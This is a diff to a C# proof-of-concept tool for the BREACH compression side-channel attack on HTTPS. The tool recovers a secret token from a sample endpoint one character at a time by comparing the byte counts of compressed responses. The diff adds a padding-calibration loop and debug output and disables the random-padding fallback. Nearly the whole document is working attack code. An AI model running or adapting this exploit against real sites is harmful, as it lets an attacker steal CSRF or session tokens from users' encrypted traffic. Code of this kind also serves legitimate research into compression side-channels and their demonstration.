@@ -12,24 +12,28 @@ namespace BREACHBasic
         static Char[] KeySpace = new Char[] { 
             '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
         };
-
+        static bool keepgoing = true;
         // Sample, non-authenticated HTTPS-enabled endpoint vulnerable to BREACH
-        static string TargetURL = "https://malbot.net/poc/?param1=value1";
+        static string TargetURL = "https://malbot.net/poc/?param1=";
         static string canary = "request_token='";
 
         // Internal parameters
-        static string PacketRealTimeLog = Path.Combine(Path.GetTempPath(), "readBytesRealTime.txt");
+        static string PacketRealTimeLog = Path.Combine(@"D:\GitHub\BREACH\SSLProxy\SSLProxy\bin\Debug", "readBytesRealTime.txt");
         static string knownToken = String.Empty;
         static int lastFrameRead = 0;
         static int NumberOfRequests = 0;
 
         // Default padding (airbags) configuration values
-        static int PADDING_SIZE = 40; // Default
+        static int PADDING_SIZE = 500; // Default
         static int PADDING_SIZE_ADJUSTMENT = 0;
         static int PADDING_TOP = 300 - PADDING_SIZE;
         static int PADDING_BOTTOM = 20 - PADDING_SIZE;
 
-        // Main Driver
+        static bool padSet = false;
+        static int? initialByteCount = 0;
+
+
+        // Main Driver        
         static void Main(string[] args)
         {
             // If requirements do not pass, exit
@@ -54,19 +58,18 @@ namespace BREACHBasic
                 // Initial keyspace probing 
                 foreach (char c in KeySpace)
                 {
-                    if (ForceRecoveryMode)
-                        break;
-
                     // Provided only one guess has better compression that its peers, we accept it
                     if (IsCorrectGuess(canary + knownToken, c.ToString(), ref knownBad))
                     {
                         WriteConsoleSuccess("[>] The winner is... " + c);
+                        
 
                         if (winner != null)
                         {
                             WriteConsoleError("\n[!] FIRST ROUND COLLISION - We already had a winner!! (" + winner + " vs. " + c + ")");
                             WriteConsoleWarning("Forcing recovery mode.\n");
 
+                            //Console.ReadKey();
                             winner = null;
                             ForceRecoveryMode = true;
                             break;
@@ -75,6 +78,7 @@ namespace BREACHBasic
                         else
                         {
                             winner = c;
+                            PADDING_SIZE--;
                         }
                     }
 
@@ -84,16 +88,16 @@ namespace BREACHBasic
                     }
                 }
 
-                // If we didn't find a winner -or found too many-, try different padding sizes
-                if (winner == null && AirbagExpansions < 5)
-                {
-                    Random myRandom = new Random();
-                    PADDING_SIZE_ADJUSTMENT = myRandom.Next(PADDING_BOTTOM, PADDING_TOP);
+                //// If we didn't find a winner -or found too many-, try different padding sizes
+                //if (winner == null && AirbagExpansions < 5)
+                //{
+                //    Random myRandom = new Random();
+                //    PADDING_SIZE_ADJUSTMENT = myRandom.Next(PADDING_BOTTOM, PADDING_TOP);
 
-                    WriteConsoleInfo("[ Brief Airbag Expansion (#" + (AirbagExpansions + 1) + " @ " + (PADDING_SIZE + PADDING_SIZE_ADJUSTMENT) + ") ]");
-                    AirbagExpansions++;
-                    continue;
-                }
+                //    WriteConsoleInfo("[ Brief Airbag Expansion (#" + (AirbagExpansions + 1) + " @ " + (PADDING_SIZE + PADDING_SIZE_ADJUSTMENT) + ") ]");
+                //    AirbagExpansions++;
+                //    continue;
+                //}
 
 
                 // Additional *BASIC* recovery mechanisms
@@ -120,6 +124,7 @@ namespace BREACHBasic
                             {
                                 WriteConsoleSuccess("[>>] The winner is... " + d);
                                 winner = d;
+                                PADDING_SIZE--;
                             }
                         }
                     }
@@ -152,18 +157,50 @@ namespace BREACHBasic
         public static bool IsCorrectGuess(
             String currentCanary,
             String guess,
+            
             ref bool knownBad)
         {
             knownBad = false;
             String padding = String.Empty;
-            for (int i = 0; i <= (PADDING_SIZE + PADDING_SIZE_ADJUSTMENT) / 2; i++)
-                padding += "{}";
+            //for (int i = 0; i <= (PADDING_SIZE + PADDING_SIZE_ADJUSTMENT) / 2; i++)
+            //    padding += "-";
+
+            for (int i = 0; i < PADDING_SIZE; i++)
+                padding += "~";
+
+
+            while (!padSet)
+            {
+                if(initialByteCount == 0)
+                {
+                    HttpGet(TargetURL + currentCanary + "0" + padding + "@");
+                    initialByteCount = ReadBytes();
+                }
+                
+                HttpGet(TargetURL + currentCanary + "0" + padding + "@");
+                int? checkBytes = ReadBytes();
+                Console.WriteLine("Initial: " + initialByteCount + "\t New: " + checkBytes + "\t Pad Length: " + padding.Length);
+                if(checkBytes != initialByteCount)
+                {
+                    Console.WriteLine("Pad size: " + padding.Length);
+                    Console.ReadKey();
+                    PADDING_SIZE = padding.Length;
+                    padSet = true;
+                }
+                if (!padSet)
+                {
+                    padding += "~";
+                }
+            }
+
 
             HttpGet(TargetURL + currentCanary + guess + padding + "@");
             int? bytes1 = ReadBytes();
 
             HttpGet(TargetURL + currentCanary + padding + guess + "@");
             int? bytes2 = ReadBytes();
+
+            Console.WriteLine("Byte Check: byte1: " + bytes1 + " byte2: " + bytes2 + " Pad Length: " + padding.Length);
 
             // If something went wrong with this read, retry one time
             if (bytes1 == null || bytes2 == null || Math.Abs(bytes1.Value - bytes2.Value) > 100)
